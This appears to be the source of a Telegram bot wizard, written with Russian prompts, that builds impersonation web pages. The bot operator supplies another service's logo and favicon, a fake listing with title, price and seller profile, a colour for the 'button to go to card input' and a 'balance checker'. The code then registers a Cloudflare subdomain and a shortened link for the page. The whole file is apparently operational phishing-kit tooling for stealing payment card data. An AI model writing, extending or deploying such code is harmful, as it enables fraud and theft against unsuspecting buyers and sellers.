const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, Profiles, MyDomains,Settings } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");

const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const myAd = require("../../commands/myAd");
const downloadImage = require("../../helpers/downloadImage");


const scene = new WizardScene(
  "create_link_service_eu",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "service_eu",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      ctx.scene.state.data = {};
      log(ctx, "перешёл к созданию ссылки (Кастом сервис)");
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Выберите метод ссылки", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Вериф", "true"),
              Markup.callbackButton("2.0", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
async (ctx) => {
  try {
    if (!["true", "false"].includes(ctx.callbackQuery?.data))
      return ctx.wizard.prevStep();

    // Присваиваем version: 0 для "Вериф", 2 для "2.0"
    ctx.scene.state.data.version = ctx.callbackQuery.data === "true" ? 0 : 2;

    return ctx.wizard.nextStep();
  } catch (err) {
    ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    return ctx.scene.leave();
  }
},
 async (ctx) => {
  try {
    const settings = await Settings.findOne({ raw: true });
    const { cf_api, cf_mail, cf_id_domain, domain } = settings;

  Object.assign(ctx.scene.state.data, {
  cfApiKey: cf_api,
  cfApiEmail: cf_mail,
});


    const service = await Service.findOne({ where: { code: "service_eu" } });

    if (service?.zone && service?.domain) {
      ctx.scene.state.data.cfZoneId = service.zone;
      ctx.scene.state.data.domain = service.domain;
    } else if (cf_id_domain && domain) {
      ctx.scene.state.data.cfZoneId = cf_id_domain;
      ctx.scene.state.data.domain = domain;
    } else {
      await ctx.reply("❌ Не удалось определить зону и домен.").catch(() => {});
      return ctx.scene.leave();
    }

    await ctx.scene.reply(
      `🌐 Введите поддомен, который будет использоваться для ссылки.\n\n` +
        `Пример: если вы введёте <code>abc</code>, ссылка будет: https://<b>abc.${ctx.scene.state.data.domain}</b>\n\n` +
        `⚠️ Допустимы только латинские буквы, цифры и дефис (3-30 символов).`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      }
    );

    return ctx.wizard.next();
  } catch (err) {
    console.error(err);
    await ctx.reply("❌ Ошибка при получении данных").catch(() => {});
    return ctx.scene.leave();
  }
},


async (ctx) => {
  try {
    const input = ctx.message?.text?.trim().toLowerCase();
    const isValid = /^[a-z0-9-]{3,30}$/.test(input);
    if (!isValid) {
      await ctx.scene.reply("⚠️ Неверный формат. Введите поддомен снова.", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      return ctx.wizard.selectStep(ctx.wizard.cursor);
    }

    const subdomain = input;
    ctx.scene.state.data.subdomain = subdomain;

    const ip = await axios.get("https://api.ipify.org?format=json").then((r) => r.data.ip);

    const tryAddRecord = async (zoneId, domain) => {
      try {
        await axios.post(
          `https://api.cloudflare.com/client/v4/zones/${zoneId}/dns_records`,
          {
            type: "A",
            name: subdomain,
            content: ip,
            ttl: 3600,
            proxied: true,
          },
          {
            headers: {
              "X-Auth-Email": ctx.scene.state.data.cfApiEmail,
              "X-Auth-Key": ctx.scene.state.data.cfApiKey,
              "Content-Type": "application/json",
            },
          }
        );
        ctx.scene.state.data.cfZoneId = zoneId;
        ctx.scene.state.data.domain = domain;
        return true;
      } catch (err) {
        const errorCode = err.response?.data?.errors?.[0]?.code;
        const alreadyExists = err.response?.data?.errors?.[0]?.message?.includes("already exists");
        if (alreadyExists || errorCode === 81057) return true;
        if (errorCode === 7003) return false;

        console.error("Ошибка добавления поддомена:", err.response?.data || err);
        await ctx.reply("❌ Ошибка при добавлении поддомена.");
        return null;
      }
    };

    const zoneOk = await tryAddRecord(
      ctx.scene.state.data.cfZoneId,
      ctx.scene.state.data.domain
    );

    if (zoneOk === null || zoneOk === false) {
      await ctx.reply("❌ Не удалось создать поддомен. Проверьте зону и домен.");
      return ctx.scene.leave();
    }

    return ctx.wizard.nextStep();
  } catch (err) {
    console.error(err);
    await ctx.reply("❌ Ошибка обработки.").catch(() => {});
    return ctx.scene.leave();
  }
},

  async (ctx) => {
    try {
      ctx.scene.state.data.code = "service_eu";
      await ctx.scene
        .reply("Введите название объявления", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text || typeof ctx.message.text !== "string") {
        await ctx.reply(
          "⚠️ Введите корректное название объявления (только текст)."
        );
        return ctx.wizard.prevStep();
      }

      ctx.scene.state.data.title = ctx.message.text;
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
        await ctx.scene.reply("Выберите язык страницы", {
            reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("🇬🇧 English", "en")],
                [Markup.callbackButton("🇵🇱 Polski", "pl"), Markup.callbackButton("🇳🇱 Nederlands", "nl")],
                [Markup.callbackButton("🇧🇦 Bosanski", "ba"), Markup.callbackButton("🇪🇸 Español", "es")],
                [Markup.callbackButton("🇩🇪 Deutsch", "de"), Markup.callbackButton("🇩🇰 Dansk", "dk")],
                [Markup.callbackButton("🇵🇹 Português", "pt"), Markup.callbackButton("🇷🇴 Română", "ro")],
                [Markup.callbackButton("🇸🇪 Svenska", "se"), Markup.callbackButton("🇭🇷 Hrvatski", "hr")],
                [Markup.callbackButton("🇸🇰 Slovenčina", "sk"), Markup.callbackButton("🇨🇿 Čeština", "cz")],
                [Markup.callbackButton("🇫🇷 Français", "fr"), Markup.callbackButton("🇧🇬 Български", "bg")],
                [Markup.callbackButton("🇧🇪 Nederlands (BE)", "nl"), Markup.callbackButton("🇮🇹 Italiano", "it")],
                [Markup.callbackButton("🇨🇭 Deutsch (CH)", "ch"), Markup.callbackButton("🇨🇿 Čeština", "cs")],
                [Markup.callbackButton("🇳🇴 Norsk", "no"), Markup.callbackButton("🇱🇹 Lietuvių", "lt")],
                [Markup.callbackButton("🇱🇻 Latviešu", "lv"), Markup.callbackButton("🇪🇪 Eesti", "est")],
                [Markup.callbackButton("🇭🇺 Magyar", "hu"),Markup.callbackButton("🇹🇷 Türkçe", "tr"                )],
                [Markup.callbackButton("Отменить", "cancel")],
            ]),
        });

        return ctx.wizard.next();
    } catch (err) {
        console.log(err);
        ctx.reply("❌ Ошибка").catch((err) => err);
        return ctx.scene.leave();
    }
},

// 🔹 Шаг 4: Сохранение выбора языка
async (ctx) => {
    try {
        // Оставляем только нужные языки
        const availableLanguages = [
            "pl", "en", "nl", "ba", "es", "de", "dk", "pt", "ro", "se", "hr", "sk", "cz", "fr",
            "bg", "be", "it", "ch", "cs", "no", "lt", "lv", "est", "hu","tr"
        ];

        if (!ctx.callbackQuery?.data || !availableLanguages.includes(ctx.callbackQuery.data)) {
            return ctx.wizard.prevStep();
        }

        ctx.scene.state.data.language = ctx.callbackQuery.data;
        await ctx.answerCbQuery();
        return ctx.wizard.nextStep(); // Переход к следующему шагу
    } catch (err) {
        console.log(err);
        ctx.reply("❌ Ошибка").catch((err) => err);
        return ctx.scene.leave();
    }
},

  async (ctx) => {
    try {
      if (ctx.scene.state.data.version == 0) {
        return ctx.wizard.nextStep();
      }
      await ctx.scene
        .reply("Выберите валюту", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("💵 Доллар США (USD)", "USD"),
              Markup.callbackButton("💶 Евро (EUR)", "EUR"),
            ],
            [
              Markup.callbackButton("💷 Фунт стерлингов (GBP)", "GBP"),
              Markup.callbackButton("🇨🇭 Швейцарский франк (CHF)", "CHF"),
            ],
            [
              Markup.callbackButton("🇨🇦 Канадский доллар (CAD)", "CAD"),
              Markup.callbackButton("🇦🇺 Австралийский доллар (AUD)", "AUD"),
            ],
            [
              Markup.callbackButton("🇯🇵 Японская иена (JPY)", "JPY"),
              Markup.callbackButton("🇨🇳 Китайский юань (CNY)", "CNY"),
            ],
            [
              Markup.callbackButton("🇸🇬 Сингапурский доллар (SGD)", "SGD"),
              Markup.callbackButton("🇭🇰 Гонконгский доллар (HKD)", "HKD"),
            ],
            [
              Markup.callbackButton("🇰🇷 Южнокорейская вона (KRW)", "KRW"),
              Markup.callbackButton("🇮🇳 Индийская рупия (INR)", "INR"),
            ],
            [
              Markup.callbackButton("🇧🇷 Бразильский реал (BRL)", "BRL"),
              Markup.callbackButton("🇲🇽 Мексиканское песо (MXN)", "MXN"),
            ],
            [
              Markup.callbackButton("🇿🇦 Южноафриканский рэнд (ZAR)", "ZAR"),
              Markup.callbackButton("🇸🇪 Шведская крона (SEK)", "SEK"),
            ],
            [
              Markup.callbackButton("🇳🇴 Норвежская крона (NOK)", "NOK"),
              Markup.callbackButton("🇩🇰 Датская крона (DKK)", "DKK"),
            ],
            [
              Markup.callbackButton("🇹🇷 Турецкая лира (TRY)", "TRY"),
              Markup.callbackButton("🇦🇪 Дирхам ОАЭ (AED)", "AED"),
            ],
            [
              Markup.callbackButton("🇳🇬 Найра (NGN)", "NGN"),       // Нигерия
              Markup.callbackButton("🇿🇦 Ранд (ZAR)", "ZAR"),       // Южная Африка
            ],
            [
              Markup.callbackButton("🇪🇬 Египетский фунт (EGP)", "EGP"), // Египет
              Markup.callbackButton("🇰🇪 Кенийский шиллинг (KES)", "KES"), // Кения
            ],
            [
              Markup.callbackButton("🇬🇭 Седи (GHS)", "GHS"),       // Гана
              Markup.callbackButton("🇲🇦 Марокканский дирхам (MAD)", "MAD"), // Марокко
            ],
            [
              Markup.callbackButton("🇵🇰 Пакистанская рупия (PKR)", "PKR"), // Пакистан
            ],
            
            [
              Markup.callbackButton("Без цены", "no_price"),
              Markup.callbackButton("Отменить", "cancel"),
            ],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      if (ctx.scene.state.data.version == 0) {
        return ctx.wizard.nextStep();
      }
      const currencySymbols = {
        USD: "$",
        EUR: "€",
        GBP: "£",
        CHF: "₣",
        CAD: "C$",
        AUD: "A$",
        JPY: "¥",
        CNY: "¥",
        SGD: "S$",
        HKD: "HK$",
        KRW: "₩",
        INR: "₹",
        BRL: "R$",
        MXN: "MX$",
        ZAR: "R",
        SEK: "kr",
        NOK: "kr",
        DKK: "kr",
        TRY: "₺",
        AED: "AED",
        // Африка:
        NGN: "₦",
        EGP: "£",
        KES: "KSh",
        GHS: "₵",
        MAD: "DH",
        XOF: "CFA",
        XAF: "CFA",
        TZS: "TSh",
        // Пакистан:
        PKR: "₨", // добавлено!
      };
      
      

      const validCurrencies = Object.keys(currencySymbols).concat("no_price");

      if (!validCurrencies.includes(ctx.callbackQuery?.data))
        return ctx.wizard.prevStep();

      ctx.scene.state.data.currency = ctx.callbackQuery.data;

      if (ctx.scene.state.data.currency === "no_price") {
        ctx.scene.state.data.price = null;
        return ctx.wizard.nextStep();
      }

      const currencySymbol =
        currencySymbols[ctx.scene.state.data.currency] ||
        ctx.scene.state.data.currency;

      await ctx.scene
        .reply(`Введите цену объявления (только число, в ${currencySymbol})`, {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);

      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.scene.state.data.version == 0) {
        return ctx.wizard.nextStep();
      }
      if (ctx.scene.state.data.currency !== "no_price") {
        var amount = parseFloat(ctx.message?.text);
        if (isNaN(amount)) return ctx.wizard.prevStep();
        if (amount % 1 == 0) amount = amount.toFixed(0);
        else amount = amount.toFixed(2);
        const currencySymbols = {
          USD: "$",
          EUR: "€",
          GBP: "£",
          CHF: "₣",
          CAD: "C$",
          AUD: "A$",
          JPY: "¥",
          CNY: "¥",
          SGD: "S$",
          HKD: "HK$",
          KRW: "₩",
          INR: "₹",
          BRL: "R$",
          MXN: "MX$",
          ZAR: "R",
          SEK: "kr",
          NOK: "kr",
          DKK: "kr",
          TRY: "₺",
          AED: "AED",
          PKR: "₨", // добавлено сюда тоже!
        };
        

        const currencySymbol =
          currencySymbols[ctx.scene.state.data.currency] ||
          ctx.scene.state.data.currency;

        ctx.scene.state.data.price = `${amount} ${currencySymbol} `;
      }

      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);

      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
     if (ctx.scene.state.data.version == 0) {
        return ctx.wizard.nextStep();
      }
      const profiles = await Profiles.findAll({
        where: { userId: ctx.from.id },
      });

      if (profiles.length === 0) {
        await ctx.reply("⚠️ У вас нет доступных профилей.");
        return ctx.scene.leave();
      }

      const buttons = profiles.map((v) => [
        Markup.callbackButton(v.title, v.id),
      ]);

      await ctx.scene.reply(`Выберите профиль`, {
        reply_markup: Markup.inlineKeyboard([
          ...buttons,
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      if (ctx.scene.state.data.version == 0) {
        return ctx.wizard.nextStep();
      }
      // Если не пришёл callbackQuery, значит пользователь не нажал на кнопку
      if (!ctx.callbackQuery?.data) {
        return ctx.wizard.prevStep();
      }

      // Ответ на callback-запрос, чтобы скрыть "часики" в Telegram
      await ctx.answerCbQuery();

      const profile = await Profiles.findOne({
        where: { id: ctx.callbackQuery.data },
      });

      if (!profile) {
        await ctx.reply("❌ Профиль не найден. Попробуйте ещё раз.");
        return ctx.scene.leave();
      }

      // Создаем объект для хранения данных профиля
      const profileData = {
        address: profile.address,
        name: profile.name,
        phone: profile.phone,
      };

      // Добавляем данные профиля в `ctx.scene.state.data`, не перезаписывая другие данные
      Object.assign(ctx.scene.state.data, profileData);

      // Логируем, чтобы проверить, что данные сохранились корректно

      // Переход к следующему шагу
      return ctx.wizard.nextStep();
    } catch (error) {
      console.error("Ошибка при получении профиля:", error);
      await ctx.reply("❌ Ошибка при получении профиля. Попробуйте ещё раз.");
      return ctx.scene.leave();
    }
  },

 async (ctx) => {
    try {
      ctx.scene.state.data.code = "service_eu";

      await ctx.scene.reply(
        "📥 Отправьте ссылку на **логотип сервиса**\n\n" +
        "✅ *Поддерживаемые форматы:* PNG, SVG, JPG, JPEG, GIF, WEBP (желательно без фона)\n" +
        "❌ *Недопустимые:* PDF, BMP и др.\n\n" +
        "`Пример:` https://example.com/logo.png",
        {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
          parse_mode: "Markdown",
        }
      );

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch(() => { });
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      const validUrlRegex = /^https?:\/\/[^\s]+$/i;

      if (!ctx.message?.text) {
        await ctx.scene.reply("⚠️ Пожалуйста, отправьте ссылку.", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
          parse_mode: "Markdown",
        });
        return;
      }

      const logoUrl = ctx.message.text.trim();

      if (!validUrlRegex.test(logoUrl)) {
        await ctx.scene.reply(
          "❌ *Неверный формат ссылки!*\n" +
          "Пожалуйста, отправьте корректный URL, начинающийся с `http://` или `https://`.\n\n" +
          "_Примеры:_\n" +
          "`https://site.com/logo.png`\n" +
          "`https://cdn.site.com/logo?id=123`",
          {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
            parse_mode: "Markdown",
          }
        );
        return;
      }

      ctx.scene.state.data.logo = escapeHTML(logoUrl);
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);
      ctx.reply("❌ Ошибка").catch(() => { });
      return ctx.scene.leave();
    }
  },



  async (ctx) => {
    try {
      await ctx.scene.reply(
        "🌐 Отправьте ссылку на **favicon** (иконка для вкладки)\n\n" +
        "✅ *Форматы:* PNG, ICO, SVG, WEBP, JPG, AVIF, GIF (рекомендуется: прозрачный фон)\n" +
        "📏 *Размер:* 32×32px или 64×64px\n\n" +
        "`Пример:` https://example.com/favicon.png\n\n" +
        "👇 Если у вас нет иконки — нажмите кнопку **Пропустить**",
        {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Пропустить", "skip_favicon")],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
          parse_mode: "Markdown",
        }
      );
      return ctx.wizard.next();
    } catch (err) {
      console.error(err);
      ctx.reply("❌ Ошибка").catch(() => { });
      return;
    }
  },

  async (ctx) => {
    try {
      const validUrlRegex = /^https?:\/\/[^\s]+$/i;

      // Пропуск
      if (ctx.callbackQuery?.data === "skip_favicon") {
        ctx.scene.state.data.favicon = "https://i.ibb.co/pBS1tm5p/6963703.png";
        await ctx.editMessageText("✅ Favicon пропущен. Установлена стандартная иконка.");
        return ctx.wizard.nextStep();
      }

      if (!ctx.message?.text) {
        await ctx.scene.reply("⚠️ Пожалуйста, отправьте ссылку на favicon.", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
          parse_mode: "Markdown",
        });
        return;
      }

      const faviconUrl = ctx.message.text.trim();

      if (!validUrlRegex.test(faviconUrl)) {
        await ctx.scene.reply(
          "❌ *Некорректная ссылка!*\n" +
          "Отправьте правильную ссылку на favicon.\n\n" +
          "_Пример:_ `https://example.com/favicon.png`",
          {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
            parse_mode: "Markdown",
          }
        );
        return;
      }

      ctx.scene.state.data.favicon = escapeHTML(faviconUrl);
      return ctx.wizard.nextStep();
    } catch (err) {
      console.error(err);
      ctx.reply("❌ Ошибка").catch(() => { });
      return ctx.scene.leave();
    }
  },


  async (ctx) => {
    try {
      // Получаем профиль пользователя

      // Запрашиваем у пользователя цвет кнопки
      await ctx.scene.reply(
        "Введите код цвета кнопки для перехода к вводу карты.\n\n" +
          "📌 **Примеры форматов:**\n" +
          "HEX → <code>#FF5733</code>\n" +
          "RGB → <code>rgb(255, 87, 51)</code>\n" +
          "RGBA → <code>rgba(255, 87, 51, 0.5)</code>\n" +
          "HSL → <code>hsl(11, 100%, 50%)</code>\n\n" +
          "🎨 Выбрать цвет можно здесь: https://htmlcolorcodes.com",
        {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
          parse_mode: "HTML",
        }
      );

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);

      ctx.replyOrEdit("❌ Произошла ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      if (!ctx.message?.text) return ctx.wizard.prevStep();

      let colorInput = ctx.message.text.trim();

      // Регулярные выражения для проверки форматов
      const hexRegex = /^#([0-9A-Fa-f]{6}|[0-9A-Fa-f]{3})$/;
      const rgbRegex = /^rgb\(\d{1,3},\s?\d{1,3},\s?\d{1,3}\)$/;
      const rgbaRegex =
        /^rgba\(\d{1,3},\s?\d{1,3},\s?\d{1,3},\s?(0|1|0?\.\d+)\)$/;
      const hslRegex = /^hsl\(\d{1,3},\s?\d{1,3}%,\s?\d{1,3}%\)$/;
      const customRegex = /^@\w+$/;

      if (
        hexRegex.test(colorInput) ||
        rgbRegex.test(colorInput) ||
        rgbaRegex.test(colorInput) ||
        hslRegex.test(colorInput) ||
        customRegex.test(colorInput)
      ) {
        ctx.scene.state.data.color = escapeHTML(colorInput);
        return ctx.wizard.nextStep();
      } else {
        await ctx.reply("⚠️ Неверный формат цвета. Попробуйте снова.");
        return ctx.wizard.prevStep();
      }
    } catch (err) {
      console.log(err);

      ctx.replyOrEdit("❌ Произошла ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      await ctx.scene
        .reply("Отправьте изображение товара", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Пропустить", "skip")],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.message?.photo?.length < 1 && ctx.callbackQuery?.data !== "skip")
        return ctx.wizard.prevStep();
      if (ctx.callbackQuery?.data == "skip") return ctx.wizard.nextStep();
      const photo_link = await ctx.telegram.getFileLink(
        ctx.message.photo[1].file_id
      );
      ctx.scene.state.data.photo = await downloadImage(photo_link);
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      await ctx.scene
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery?.data))
        return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: ctx.scene.state.data.code,
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }

       const adId = parseInt(
        rand(999999, 99999999) + new Date().getTime() / 10000
      );

      const customLink = `https://${ctx.scene.state.data.subdomain}.${ctx.scene.state.data.domain}/${adId}`;


      const ad = await Ad.create({
        id: adId,
        customLink: customLink,

        userId: ctx.from.id,
        balanceChecker: ctx.scene.state.data.balanceChecker,
        logo: ctx.scene.state.data.logo,
        version: ctx.scene.state.data.version, // ← Используем ctx.scene.state.data.version == 0
        photo: ctx.scene.state.data.photo,
        name: ctx.scene.state.data.name,
        about: ctx.scene.state.data.about,
        date: ctx.scene.state.data.date,
        address: ctx.scene.state.data.address,
        price: ctx.scene.state.data.price,
        title: ctx.scene.state.data.title,
        serviceCode: ctx.scene.state.data.code,
        color: ctx.scene.state.data.color,
        favicon: ctx.scene.state.data.favicon,
        language: ctx.scene.state.data.language,
      });

     
      log(
        ctx,
        `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`
      );
      const domains = await MyDomains.findOne({ 
        where: { userId: ctx.from.id }, 
      }); 
       
      let reductionUrl; 
       
      try { 
        const reduction = await axios.post( 
          "http://185.208.158.144/api/create", 
          { 
            target: `https://${ctx.scene.state.data.subdomain}.${ctx.scene.state.data.domain}/${adId}`,
            domain: service.shortlink || ctx.state.bot.shortlink, 
          }, 
          { timeout: 2000 } 
        ); 
       
        reductionUrl = reduction.data.url; 
      } catch (error) { 
        console.error("Ошибка при создании сокращенной ссылки:", error.message); 
       
        if (error.code === 'ECONNABORTED') { 
          console.warn("Запрос превысил допустимый тайм-аут."); 
        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') { 
          console.warn("Сервер сокращений недоступен."); 
        } else { 
          console.warn("Произошла непредвиденная ошибка:", error.message); 
        } 
       
        reductionUrl = null; // корректный fallback 
      } 
       
      const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null; 
       
      await ad.update({ 
        myDomainLink: personalDomainLink, 
        shortLink: reductionUrl, // используем переменную 
      }); 
       
log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`); 

// Собираем сообщение 
try {
  await myAd(ctx, ad.id);
} catch (err) {
  await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => {});
}
      ctx.updateType = "message";
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    }
    return ctx.scene.leave();
  }
);

module.exports = scene;
